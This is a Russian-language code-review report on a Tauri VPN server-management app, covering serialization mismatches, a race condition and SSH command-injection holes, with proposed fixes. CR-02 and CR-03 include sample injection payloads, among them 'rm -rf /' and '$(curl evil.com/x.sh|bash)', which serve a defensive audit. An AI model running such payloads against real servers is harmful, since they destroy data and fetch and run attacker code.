### CR-01: ABI mismatch — `pin_certificate_der`/`leaf_der` сериализуется как массив байтов, фронт ждёт base64 строку (фича cert pinning полностью сломана)

**Files:**
- `gui-app/src-tauri/src/ssh/server/cert_probe.rs:30-36`
- `gui-app/src-tauri/src/ssh/server/server_install.rs:369`
- `gui-app/src-tauri/src/ssh/server/server_config.rs:310`
- `gui-app/src-tauri/src/components/server/CertificateFingerprintCard.tsx:78-90`
- `gui-app/src/components/server/UserModal.tsx:54, 324`

**Issue:**
`EndpointCertInfo { leaf_der: Vec<u8>, ... }` и параметры `pin_certificate_der: Option<Vec<u8>>` сериализуются `serde_json` **как JSON-массив чисел** `[1,2,3,...]`, а **не** как base64-строка.

Однако фронтенд (`CertificateFingerprintCard.tsx:78`) ожидает `{ leaf_der_b64: string; ... }` — поле с именем `leaf_der_b64` **никогда не возвращается бэкендом** → `result.leaf_der_b64` всегда `undefined` → `cert.derB64 = undefined` → `onFingerprintLoaded(undefined, "fp")` → `certDerB64` записывается как `undefined`.

При вызове `server_add_user_advanced` фронт передаёт `certDerB64: deeplink.pinCert ? deeplink.certDerB64 : null` (строка base64 либо null), но Rust ждёт `pin_certificate_der: Option<Vec<u8>>` — Tauri/serde НЕ распарсит base64-string в `Vec<u8>`, выдаст deserialization error либо проигнорирует. **Cert pinning не работает в принципе.**

**Fix:**

Bэкенд (`cert_probe.rs`):
```rust
use base64::{engine::general_purpose::STANDARD as B64, Engine as _};

#[derive(serde::Serialize, Clone, Debug)]
pub struct EndpointCertInfo {
    /// Base64-encoded DER bytes — fronted-friendly format.
    pub leaf_der_b64: String,
    pub fingerprint_hex: String,
    pub chain_len: usize,
}

// в fetch_endpoint_cert():
let leaf_der_b64 = B64.encode(&leaf_der);
let digest = Sha256::digest(&leaf_der);
Ok(EndpointCertInfo { leaf_der_b64, fingerprint_hex, chain_len: chain.len() })
```

Параметры команд `server_add_user_advanced` и `server_export_config_deeplink_advanced`:
```rust
pin_certificate_der: Option<String>,  // base64-encoded DER
// внутри:
let pin_der_bytes: Option<Vec<u8>> = pin_certificate_der
    .as_deref()
    .map(|s| B64.decode(s).map_err(|e| format!("invalid cert b64: {e}")))
    .transpose()?;
if let Some(der) = &pin_der_bytes {
    if der.len() > 8192 { return Err("cert DER too large".into()); }
}
```

Альтернатива — использовать `serde_with::base64::Base64` или новый serde-helper, чтобы переименование `leaf_der` → `leaf_der_b64` и base64 преобразование было автоматическим.

### CR-02: SSH command injection через `displayName` (TLV `name` field) — RCE на сервере при вводе вредоносного displayName

**File:** `gui-app/src-tauri/src/ssh/server/server_config.rs:328-334`

**Issue:**
В `export_config_deeplink_advanced`:
```rust
if let Some(n) = &name {
    if !n.is_empty() {
        let escaped_n = n.replace('"', "\\\"");
        cli_args.push_str(&format!(" -n \"{escaped_n}\""));
    }
}
```

Экранируется только `"`, но НЕ `;`, `|`, `&`, `$`, `` ` ``, `\\`, `(`, `)` и newline. Бэкенд не имеет валидатора для `name`. Фронтенд (`UserModal.tsx:591`) только обрезает до 64 символов (`.slice(0, 64)`), но не валидирует содержимое.

**Атака:** displayName = `x"; rm -rf /; echo "y` после `replace('"', "\\\"")` становится `x\"; rm -rf /; echo \"y`. Подставляется в shell:
```
... -n "x\"; rm -rf /; echo \"y" ...
```
Bash убирает `\"` обратно в `"`:
```
... -n "x"; rm -rf /; echo "y" ...
```
Получаем выполнение `rm -rf /` на удалённом сервере **с правами sudo**.

DNS-сервера также конкатенируются без quoting (`cli_args.push_str(&format!(" -d {t}"))`, строка 338), но `validate_dns_list` запрещает все опасные символы (`;`, `|`, `$`, `` ` ``, `\\`). DNS — безопасен. Display name — нет.

**Fix:**

Добавить валидатор в `sanitize.rs`:
```rust
/// Display name for deeplink TLV 0x0C — printable, no shell metacharacters.
pub fn validate_display_name(s: &str) -> Result<(), String> {
    if s.is_empty() { return Ok(()); }
    if s.len() > 64 {
        return Err("Display name too long (max 64 chars)".into());
    }
    if s.chars().any(|c| {
        c.is_control() || matches!(c, '\'' | '"' | '`' | '$' | '\\' | ';' | '|' | '&'
            | '(' | ')' | '<' | '>' | '\n' | '\r' | '\0')
    }) {
        return Err("Display name contains invalid characters".into());
    }
    Ok(())
}
```

И вызвать в `export_config_deeplink_advanced` сразу после других валидаций:
```rust
if let Some(n) = &name {
    validate_display_name(n)?;
}
```

(Также добавить unit-тесты с строками вида `x"; rm -rf /; echo "y` и `$(whoami)`.)

### CR-03: SSH command injection в `server_rotate_user_password` — `python3 -c "..."` использует двойные кавычки → пароль с `"`, `$`, `` ` ``, `\` ломает шелл

**File:** `gui-app/src-tauri/src/ssh/server/server_install.rs:305-328`

**Issue:**
```rust
let escaped_user = vpn_username.replace('\\', "\\\\").replace('\'', "\\'");
let escaped_pass = new_password.replace('\\', "\\\\").replace('\'', "\\'");

let rotate_cmd = format!(
    r#"{sudo}python3 -c "
import re, os, tempfile
...
new_content, n = re.subn(pattern, lambda m: m.group(1) + '{pass}' + m.group(2), content)
...
""#,
```

Экранируется только `\\` и `\'`, но **внешний контекст — двойные кавычки bash**. Двойные кавычки bash интерпретируют `$`, `` ` ``, `\\`, `"`. Из них:
- `validate_vpn_password` (`sanitize.rs:22-30`) **разрешает** `"`, `$`, `` ` ``, `\\`.

**Атака 1** (двойная кавычка): пароль `evil"; rm -rf /; #` пройдёт валидацию (нет control chars), не экранирован для bash → закроет внешние двойные кавычки python3 -c → выполнит `rm -rf /` с sudo.

**Атака 2** (command substitution): пароль `$(curl evil.com/x.sh|bash)` пройдёт валидацию → bash подставит результат `$(...)` ДО передачи в python3 → arbitrary RCE.

**Fix:**

Вариант 1 (рекомендуется) — heredoc с одиночными кавычками (как в `add_server_user`):
```rust
let escaped_user = vpn_username.replace('\\', "\\\\").replace('\'', "\\'");
let escaped_pass = new_password.replace('\\', "\\\\").replace('\'', "\\'");
let rotate_cmd = format!(
    r#"{sudo}python3 << 'PY_ROTATE_EOF'
import re, os, tempfile
path = '{dir}/credentials.toml'
with open(path, 'r') as f:
    content = f.read()
pattern = r'(\[\[client\]\]\s*\nusername\s*=\s*"{user}"\s*\npassword\s*=\s*")[^"]*(")'
new_content, n = re.subn(pattern, lambda m: m.group(1) + '{pass}' + m.group(2), content)
if n == 0:
    raise SystemExit(9)
fd, tmp = tempfile.mkstemp(dir=os.path.dirname(path))
with os.fdopen(fd, 'w') as f:
    f.write(new_content)
os.replace(tmp, path)
PY_ROTATE_EOF"#,
    sudo = sudo, dir = dir, user = escaped_user, pass = escaped_pass,
);
```

Вариант 2 — расширить `validate_vpn_password` чтобы запрещать `"`, `$`, `` ` ``, `\\`:
```rust
pub fn validate_vpn_password(s: &str) -> Result<(), String> {
    if s.is_empty() || s.len() > 128 { ... }
    if s.chars().any(|c| {
        c.is_control() || matches!(c, '"' | '$' | '`' | '\\')
    }) {
        return Err("Password contains shell-unsafe characters".into());
    }
    Ok(())
}
```

(Это break change — старые сложные пароли могут перестать валидироваться. Рекомендуется combo: heredoc + лишь `\0`/control запрет.)

### CR-04: `find_user_rule` / `remove_user_rule` используют `prefix_str.contains(&marker)` — пользователи с pure-prefix-overlap mis-matched

**File:** `gui-app/src-tauri/src/ssh/server/server_rules.rs:67-70, 86-92`

**Issue:**
```rust
let marker = format!("# User: {}", username);
rules.retain(|rule| {
    let prefix_str = rule.decor().prefix().and_then(|r| r.as_str()).unwrap_or("");
    !prefix_str.contains(&marker)
});
```

`String::contains` — substring match. Если есть пользователи `alice` и `alice_jr`, marker `"# User: alice"` есть substring marker'а `"# User: alice_jr"`.

**Воспроизведение:**
1. Add user `alice_jr` → rules.toml содержит `\n# User: alice_jr\n[[rule]]...`
2. `find_user_rule(content, "alice")` → найдёт rule `alice_jr` (false positive!)
3. `remove_user_rule(content, "alice")` → удалит rule `alice_jr` (data corruption!)
4. Если потом вызвать `server_update_user_config(alice_jr, ...)` → rule пропал → `find_user_rule` вернёт None → создастся новое правило, но старое навсегда потеряно.

**Fix:**

Использовать line-exact match:
```rust
let marker = format!("# User: {}", username);
let matches_marker = |prefix_str: &str| -> bool {
    prefix_str
        .lines()
        .any(|line| line.trim() == marker)
};
rules.retain(|rule| {
    let prefix_str = rule.decor().prefix().and_then(|r| r.as_str()).unwrap_or("");
    !matches_marker(prefix_str)
});
```

И аналогично в `find_user_rule`. Добавить тест:
```rust
#[test]
fn find_user_does_not_match_prefix_substring() {
    let mut content = add_user_rule("", "alice", Some("aa"), None).unwrap();
    content = add_user_rule(&content, "alice_jr", Some("bb"), None).unwrap();
    let alice = find_user_rule(&content, "alice").unwrap().unwrap();
    assert_eq!(alice.client_random_prefix.as_deref(), Some("aa")); // НЕ "bb"!
    let removed = remove_user_rule(&content, "alice").unwrap();
    assert!(find_user_rule(&removed, "alice_jr").unwrap().is_some(), "alice_jr must survive removal of alice");
}
```

### CR-05: UserConfig type mismatch — Frontend ожидает `{cidr, has_prefix}`, бэкенд возвращает `{client_random_prefix, cidr}` или `null` → `cfg.has_prefix` всегда `undefined` (anti-DPI всегда показывается ON), `cfg.cidr` падает при `Option::None`

**File:** `gui-app/src/components/server/UserModal.tsx:60-64, 233-256`

**Issue:**
```ts
interface UserConfig {
  cidr: string;
  has_prefix: boolean;
}

void invoke<UserConfig>("server_get_user_config", { ... })
  .then((cfg) => {
    setDeeplink((prev) => ({
      ...prev,
      cidr: cfg.cidr ?? "",
      antiDpi: cfg.has_prefix ?? true,
    }));
    ...
  })
```

Однако бэкенд `server_get_user_config` (`server_install.rs:538-551`) возвращает `Result<Option<UserRule>, String>` где `UserRule { client_random_prefix: Option<String>, cidr: Option<String> }`.

JSON-ответ:
- Если rule не найден: `null` → `cfg.cidr` бросит TypeError на `null.cidr`. Modal крашится.
- Если rule найден: `{client_random_prefix: "abcd"|null, cidr: "10.0.0.0/24"|null}` → `cfg.has_prefix = undefined → ?? true` → anti-DPI всегда показывается ON, даже если у пользователя нет prefix. `cfg.cidr` может быть null → `?? ""` спасает.

**Fix:**

Frontend (исправить тип и mapping):
```ts
interface UserConfigResponse {
  client_random_prefix: string | null;
  cidr: string | null;
}

void invoke<UserConfigResponse | null>("server_get_user_config", { ... })
  .then((cfg) => {
    setDeeplink((prev) => ({
      ...prev,
      cidr: cfg?.cidr ?? "",
      antiDpi: !!cfg?.client_random_prefix,
    }));
    initialDeeplinkRef.current = toSnapshot({
      ...DEFAULT_DEEPLINK,
      cidr: cfg?.cidr ?? "",
      antiDpi: !!cfg?.client_random_prefix,
    });
  })
```

Альтернатива (бэкенд) — возвращать flat `{cidr: String, has_prefix: bool}` для консистентности с frontend контрактом.

### WR-03: Race condition в `UserModal` — in-flight `server_get_user_config` invoke не отменяется при закрытии/смене пользователя; снепшот dirty-tracking может быть перезаписан старыми данными

**File:** `gui-app/src/components/server/UserModal.tsx:230-256`

**Issue:**
В useEffect для Edit mode invoke не имеет AbortController либо cleanup-флага:
```ts
useEffect(() => {
  if (!isOpen) return;
  if (mode === "edit" && editUsername) {
    ...
    void invoke<UserConfig>("server_get_user_config", { ... })
      .then((cfg) => {
        setDeeplink((prev) => ({...prev, cidr: cfg.cidr ?? "", antiDpi: cfg.has_prefix ?? true}));
        initialDeeplinkRef.current = toSnapshot({...});
      })
      ...
  }
  ...
}, [isOpen, mode, editUsername]);
```

Сценарий:
1. Open Edit для alice → invoke #1 запущен
2. Юзер быстро закрывает modal → useEffect cleanup НЕ отменяет invoke #1
3. Открывает Edit для bob → invoke #2 запущен
4. Invoke #1 (alice) возвращается ПОСЛЕ invoke #2 (bob)
5. setDeeplink перезаписан данными alice; `initialDeeplinkRef` показывает alice's snapshot
6. Сравнение текущего bob ↔ alice snapshot → dirty banner ложно появляется

**Fix:**
```ts
useEffect(() => {
  if (!isOpen) return;
  let cancelled = false;
  ...
  if (mode === "edit" && editUsername && !_storybook) {
    setConfigLoading(true);
    void invoke<UserConfigResponse | null>("server_get_user_config", { ... })
      .then((cfg) => {
        if (cancelled) return;
        setDeeplink((prev) => ({ ...prev, cidr: cfg?.cidr ?? "", antiDpi: !!cfg?.client_random_prefix }));
        initialDeeplinkRef.current = toSnapshot({ ...DEFAULT_DEEPLINK, cidr: cfg?.cidr ?? "", antiDpi: !!cfg?.client_random_prefix });
      })
      .catch((e) => { if (!cancelled) setConfigError(formatError(e)); })
      .finally(() => { if (!cancelled) setConfigLoading(false); });
  }
  return () => { cancelled = true; };
}, [isOpen, mode, editUsername]);
```

Аналогично для `handleRotatePassword`, `handleAdd`, `handleSave` — закрытие modal во время in-flight invoke может попытаться `setSubmitError` после unmount (warning React 19, не crash).

### WR-04: `add_server_user` heredoc-маркер `USER_EOF` теоретически уязвим к коллизии, если password = `USER_EOF`; пароль валидатор не запрещает эту конкретную строку

**File:** `gui-app/src-tauri/src/ssh/server/server_install.rs:195-203`

**Issue:**
```rust
let escaped_pass = vpn_password.replace('\\', "\\\\");
let append_cmd = format!(
    r#"{sudo}tee -a {dir}/credentials.toml > /dev/null << 'USER_EOF'

[[client]]
username = "{escaped_user}"
password = "{escaped_pass}"
USER_EOF"#,
    dir = ENDPOINT_DIR
);
```

Heredoc с одиночными кавычками (`'USER_EOF'`) — буквальный, нет интерполяции. Безопасен от `$`/`` ` ``. Однако если пароль = `USER_EOF` (или содержит эту подстроку на отдельной строке), heredoc преждевременно закроется.

`validate_vpn_password` запрещает control chars (включая `\n`), поэтому "отдельная строка" исключена. Но если пароль = `USER_EOF`, конец будет двойной EOF → bash увидит конец heredoc после первой строки `password = "USER_EOF"` (на самом деле эта строка содержит и `password =` и `USER_EOF`). Вероятность ничтожна, но это unsigned design.

**Fix:**

### IN-01: `EndpointCertInfo` комментарий «TLS/QUIC variable-length integer» вводит в заблуждение

**File:** `gui-app/src-tauri/src/ssh/server/tlv_encoder.rs:118-122`

**Issue:**
Комментарий:
```rust
/// TLS/QUIC variable-length integer encoding (7-bit groups, LSB first, MSB=continuation).
```
Описанная схема (7-bit groups, MSB continuation) — это **LEB128**, а **не** TLS Length Prefix или QUIC Variable-Length Integer (RFC 9000 §16). QUIC VLI использует фиксированную длину, кодируемую 2 старшими битами первого байта (1, 2, 4 или 8 байт). TLS просто использует длину-префикс с фиксированным размером.

Если upstream endpoint CLI (deeplink/src/encode.rs) реально использует LEB128 — комментарий следует исправить. Если он использует QUIC VLI — encoding нужно переписать, иначе deeplink несовместим. Тесты `write_varint_two_bytes` (0x80 → [0x80, 0x01]) подтверждают LEB128 — но я не могу проверить upstream.

**Fix:**
Уточнить комментарий:
```rust
/// LEB128 variable-length integer (7-bit groups, LSB first, MSB=continuation).
/// NOTE: NOT TLS length-prefix and NOT QUIC variable-length integer (RFC 9000 §16).
/// Verified against upstream deeplink/src/encode.rs as of 2026-04-18.
```

И добавить в тесты round-trip фикстуру с известным upstream-сгенерированным deeplink.

### IN-04: `validate_dns_list` пропускает entries `2001:db8::1` через char-whitelist, но регекс-проверка фронта (`isValidDnsEntry`) их отвергает

**Files:**
- `gui-app/src-tauri/src/ssh/sanitize.rs:170-186` (backend — IPv6 проходит)
- `gui-app/src/components/server/DnsUpstreamsInput.tsx:21-39` (frontend — IPv6 не проходит)

**Issue:**
Бэкенд тест (`sanitize.rs:384`):
```rust
assert!(validate_dns_list(&["2001:db8::1".to_string()]).is_ok());
```
IPv6 `2001:db8::1` проходит, т.к. `:` не в blacklist'е.

Фронтенд `isValidDnsEntry`:
```ts
if (/^\d+\.\d+\.\d+\.\d+$/.test(entry)) {...}        // только IPv4
if (/^[a-zA-Z0-9]([a-zA-Z0-9.-]*[a-zA-Z0-9])?$/.test(entry)) return true; // hostname без `:`
if (/^\d+\.\d+\.\d+\.\d+:\d+$/.test(entry)) return true;
if (/^[a-zA-Z0-9][a-zA-Z0-9.-]*:\d+$/.test(entry)) return true;
return false;
```
`2001:db8::1` не подпадает ни под одну ветку → `isValidDnsEntry` возвращает false → юзер не может ввести IPv6 DNS-сервер.

**Fix:**

Добавить ветку для IPv6 в `isValidDnsEntry`:
```ts
// IPv6: hex blocks separated by ':' optionally with '::' shorthand
if (/^[0-9a-fA-F:]+$/.test(entry) && entry.includes(":")) return true;
// IPv6 with port: [::1]:53
if (/^\[[0-9a-fA-F:]+\]:\d+$/.test(entry)) return true;
```

(Глубокая проверка IPv6 octets — отдельная работа; достаточно char-whitelist + наличие `:`.)
